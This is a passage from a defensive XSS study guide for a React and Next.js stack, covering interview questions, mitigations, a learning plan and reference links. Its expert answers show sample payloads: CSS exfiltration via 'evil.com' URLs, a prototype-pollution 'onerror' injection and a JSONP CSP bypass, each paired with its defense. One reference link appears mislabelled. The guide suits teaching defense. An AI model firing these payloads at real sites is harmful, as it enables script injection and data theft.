- **Answer:** Mostly True — when fully enforced, Trusted Types requires all DOM sinks to receive typed objects, not raw strings. However: 1) The policy itself could be badly written (allowing anything), 2) Some sinks aren't covered, 3) Bypass via prototype pollution of policy is theoretical. It eliminates the vast majority of DOM XSS.

**Q74.** How should CSP handle the case where 5 different teams own different parts of the same page (micro-frontends)?
- **Type:** Architecture
- **Answer:** Single CSP per page (HTTP header level). Options: 1) Shared CSP governance — all teams follow same policy, central security team owns header, 2) Most permissive common denominator (bad — weakens security), 3) iframe isolation — each MFE in its own iframe with own CSP (strongest but most complex), 4) Nonce propagation from shell to micro-frontends via shared context. Best: Central CSP + strict-dynamic + nonce propagation from shell.

**Q75.** What's the XSS risk of React's hydration when server HTML doesn't match client expectations?
- **Type:** Deep analysis
- **Answer:** If an attacker can modify server HTML before hydration (cache poisoning, proxy injection, CDN compromise), injected elements may persist. React hydration in production mode may not fully reconcile mismatches — it attempts to reuse existing DOM. With `suppressHydrationWarning`, React explicitly keeps server-rendered content. Risk: injected event handlers or elements survive into the hydrated app. Mitigation: CSP blocks inline handlers, SRI on scripts, cache integrity.

---

### Expert / Browser Security Engineer (35 questions)

**Q106.** Explain how HTML parser's "adoption agency algorithm" can be exploited for mutation XSS.
- **Type:** Deep analysis
- **Answer:** The adoption agency algorithm handles improperly nested formatting elements (like `<b><div></b></div>`). It reconstructs the DOM tree differently than a simple stack-based parser would expect. A sanitizer using a different algorithm might consider HTML safe, but the browser's actual DOM construction creates exploitable structures. Example: nested formatting tags that get "adopted" across tree branches, moving event handlers into unexpected positions where they execute.

**Q107.** Design a Trusted Types architecture for an enterprise with 200 frontend services, some using legacy libraries that rely on innerHTML.
- **Type:** Architecture challenge
- **Answer:** Phased approach: 1) Report-only mode globally — collect all violation data, 2) Identify top violators and categorize (own code vs library), 3) Create shared policies package (@org/trusted-types-policies) with DOMPurify-backed HTML policy, 4) Create migration guide and tooling (codemod for common patterns), 5) Allow named policies for specific use cases (rich-text-editor, markdown-renderer), 6) Default policy as safety net during migration (logs + sanitizes), 7) Enforce per-service as they pass audit, 8) Platform team provides compliant component library alternatives. Timeline: 12-18 months for full enforcement.

**Q108.** How could a CSS injection (without script execution) lead to data exfiltration?
- **Type:** Attack analysis
- **Answer:** CSS can exfiltrate data via: 1) `background: url('https://evil.com/leak?data=...')` — triggers request with data in URL, 2) Attribute selectors: `input[value^="a"] { background: url('evil.com/a') }` — enumerate form field values character by character, 3) `@font-face` with unicode-range + custom URL per range — detect which characters exist on page, 4) `:visited` link status (historically), 5) CSS `content` property with `attr()` + generated content measurement. This is why `style-src` in CSP matters even without `unsafe-inline` allowing scripts.

**Q109.** Explain how prototype pollution can lead to XSS in a React application.
- **Type:** Attack chain
- **Answer:** 1) Attacker achieves prototype pollution (e.g., via query params merged into objects: `?__proto__[dangerouslySetInnerHTML][__html]=<img src=x onerror=alert(1)>`), 2) React component spreads props: `<div {...props} />`, 3) If `props` inherits from polluted prototype, it may include `dangerouslySetInnerHTML`, 4) React renders the polluted prop as HTML → XSS. Defense: `Object.create(null)` for data objects, validate props, freeze prototypes in development, use static analysis to detect spread of untrusted objects.

**Q110.** What are the known CSP bypasses via JSONP endpoints and how do you prevent them?
- **Type:** Deep analysis  
- **Answer:** If CSP allows a domain with JSONP endpoints (e.g., `script-src https://trusted-cdn.com`), attacker can use: `<script src="https://trusted-cdn.com/jsonp?callback=alert(1)//"></script>`. The JSONP endpoint reflects the callback parameter, executing arbitrary code from a trusted source. Prevention: 1) Don't use domain-based allowlists (use nonces), 2) strict-dynamic ignores domain allowlists, 3) If JSONP is needed, validate callback to alphanumeric only, 4) Migrate to CORS-based JSON APIs.

---

## 15. Personalized Recommendations

### For Your Stack (React + Next.js + Astro + Vite + TypeScript)

#### Priority XSS Concepts

1. **Immediate:** Never use `dangerouslySetInnerHTML` without DOMPurify
2. **Immediate:** Validate all URLs before passing to `href`/`src`
3. **High:** Deploy strict CSP with nonces in Next.js middleware
4. **High:** Configure rehype-sanitize for Markdown rendering
5. **Medium:** Implement Trusted Types (report-only → enforce)
6. **Medium:** Add Semgrep/ESLint security rules to CI
7. **Advanced:** Understand hydration attack surfaces
8. **Advanced:** Design sandboxed rendering for user-generated content

#### Common Frontend Security Mistakes

| Mistake | Impact | Fix |
|---------|--------|-----|
| `dangerouslySetInnerHTML` with raw data | Stored/reflected XSS | DOMPurify sanitization |
| No URL validation on href | javascript: XSS | Protocol allowlist |
| `innerHTML` in useEffect/refs | DOM XSS | textContent or DOMPurify |
| No CSP | XSS has full impact | Strict nonce-based CSP |
| Markdown with raw HTML enabled | Stored XSS | rehype-sanitize / html: false |
| Third-party scripts without SRI | Supply chain XSS | integrity attribute |
| User input in SSR `<script>` data | Reflected XSS | JSON serialize + entity encode |
| eval() or new Function() | Code injection | Avoid entirely |

#### 60-Day Learning Plan

**Week 1-2: Foundations**
- [ ] Understand all XSS types (reflected, stored, DOM-based, mutation)
- [ ] Practice creating XSS payloads (PortSwigger labs)
- [ ] Audit your React components for `dangerouslySetInnerHTML` usage
- [ ] Implement URL validation for all user-provided links

**Week 3-4: Framework Security**
- [ ] Integrate DOMPurify for all rich text rendering
- [ ] Add ESLint `react/no-danger` rule (error level)
- [ ] Configure Markdown renderer with sanitization (rehype-sanitize)
- [ ] Audit all DOM ref usage for innerHTML patterns
- [ ] Understand React's escaping boundaries

**Week 5-6: CSP & Headers**
- [ ] Deploy CSP in report-only mode for your Next.js app
- [ ] Analyze CSP violation reports
- [ ] Migrate inline scripts to nonced external scripts
- [ ] Move to enforcing CSP
- [ ] Add security headers (XCTO, XFO, Referrer-Policy)

**Week 7-8: Advanced & Enterprise**
- [ ] Implement Trusted Types (report-only)
- [ ] Add Semgrep XSS rules to CI pipeline
- [ ] Set up DAST scanning (ZAP) against staging
- [ ] Create secure component library patterns
- [ ] Design content sanitization architecture for CMS
- [ ] Study mutation XSS and parser differentials
- [ ] Build XSS incident response playbook

---

## 16. Official Documentation & Reference Links

### Beginner

| Resource | URL |
|----------|-----|
| OWASP XSS Attack Description | https://owasp.org/www-community/attacks/xss/ |
| MDN: Web Security | https://developer.mozilla.org/en-US/docs/Web/Security |
| PortSwigger: XSS | https://portswigger.net/web-security/cross-site-scripting |
| OWASP XSS Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html |
| MDN: Content Security Policy | https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP |

### Intermediate

| Resource | URL |
|----------|-----|
| DOMPurify | https://github.com/cure53/DOMPurify |
| web.dev: Trusted Types | https://web.dev/trusted-types/ |
| CSP Reference | https://content-security-policy.com |
| Next.js CSP Guide | https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy |
| Chrome: Trusted Types | https://developer.chrome.com/docs/lighthouse/best-practices/trusted-types/ |
| PortSwigger: DOM-based XSS | https://portswigger.net/web-security/cross-site-scripting/dom-based |
| OWASP DOM XSS Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html |

### Advanced

| Resource | URL |
|----------|-----|
| Google: Strict CSP | https://csp.withgoogle.com/docs/strict-csp.html |
| Trusted Types API Spec | https://w3c.github.io/trusted-types/dist/spec/ |
| cure53: DOMPurify bypasses | https://github.com/nicedayday/DOMPurify-Issues |
| Chromium: Trusted Types | https://chromium.googlesource.com/chromium/src/+/master/docs/trusted_types_on_user_visible_text.md |
| HTML Spec: Parsing | https://html.spec.whatwg.org/multipage/parsing.html |
| PortSwigger: CSP bypass | https://portswigger.net/web-security/cross-site-scripting/content-security-policy |

### Expert / Browser Internals

| Resource | URL |
|----------|-----|
| HTML Living Standard: Tokenization | https://html.spec.whatwg.org/multipage/parsing.html#tokenization |
| Chromium Blink Source | https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/ |
| Mutation XSS Research (Heiderich) | https://cure53.de/fp170.pdf |
| DOM Clobbering Research | https://domclob.xyz |
| Google Security Blog | https://security.googleblog.com/ |
| Chromium Security Architecture | https://www.chromium.org/Home/chromium-security/ |

---

## 17. Advanced Engineering Topics

### Browser Parser Internals

The HTML parser is a state machine defined in the HTML Living Standard. Key states relevant to XSS:

```
Data State → sees '<' → Tag Open State
Tag Open State → sees letter → Tag Name State  
Tag Name State → sees space → Before Attribute Name State
Before Attribute Name State → sees letter → Attribute Name State

KEY INSIGHT: The parser has ~80 states
Each state transition determines whether content is:
- Text (safe)
- Tag (structure)  
- Attribute (potential execution)
- Script (code)

XSS exploits transitions that flip content from "data" to "code"
```

### Rendering Isolation Architecture

```
┌──────────────────────────────────────────────────────────────┐
│         Rendering Isolation Spectrum                           │
├──────────────────────────────────────────────────────────────┤
│                                                                │
│  LEAST ISOLATION                    MOST ISOLATION            │
│  ──────────────────────────────────────────────────►         │
│                                                                │
│  Same-page      Shadow DOM      Sandboxed      Separate      │
│  rendering      isolation       iframe         origin         │
│                                                                │
│  <div>           <custom-el>    <iframe         Cross-origin  │
│    {content}       #shadow        sandbox="">    iframe        │
│  </div>          </custom-el>   </iframe>                    │
│                                                                │
│  Risk: Full      Risk: CSS      Risk: Limited   Risk: None   │
│  DOM access      isolation      script access   (if strict)  │
│                  only                                         │
│                                                                │
│  Use case:       Use case:      Use case:       Use case:    │
│  Trusted         Style          User HTML       Untrusted    │
│  content         isolation      (comments)      third-party  │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### Future Browser Security Directions

- **Trusted Types v2:** Expanded sink coverage, better DX
- **Sanitizer API (browser-native):** Built-in HTML sanitizer replacing DOMPurify for basic cases
- **Speculation Rules + security:** Prefetching implications for XSS
- **View Transitions:** New rendering surface — potential new sinks
- **WebAssembly + DOM access:** New execution contexts
- **Declarative Shadow DOM:** Changes parsing model for Web Components
- **Permission-gated APIs:** Reduce XSS blast radius (can't access camera even with XSS)

---

## Summary

### Key Takeaways

1. **XSS is code injection into the browser** — understand that HTML mixes data and code
2. **Context-aware encoding is the primary defense** — different contexts need different encoding
3. **React/Astro auto-escaping prevents most XSS** — but `dangerouslySetInnerHTML`, `href`, and SSR injection remain dangerous
4. **CSP is your safety net** — blocks execution even when injection occurs
5. **Trusted Types prevents DOM XSS at the API level** — enforces sanitization at every sink
6. **DOMPurify is the standard for HTML sanitization** — never roll your own with regex
7. **Defense-in-depth is essential** — encoding + sanitization + CSP + Trusted Types + monitoring
8. **XSS impact is catastrophic** — full origin access, session hijack, persistent compromise via service workers

### Next Steps

1. Audit your current applications for `dangerouslySetInnerHTML` and `href` vulnerabilities
2. Deploy CSP in report-only mode today
3. Add DOMPurify to any component rendering user HTML
4. Set up ESLint security rules and Semgrep in CI
5. Practice XSS attacks on PortSwigger Web Security Academy

### Advanced Topics to Continue Learning

- Mutation XSS and parser differential research
- Browser Sanitizer API (upcoming standard)
- Advanced CSP bypass techniques and defenses
- Supply chain security for frontend dependencies
- Browser process isolation (site isolation, COOP/COEP)
- WebAssembly security implications
- XS-Leaks and side-channel attacks in browsers

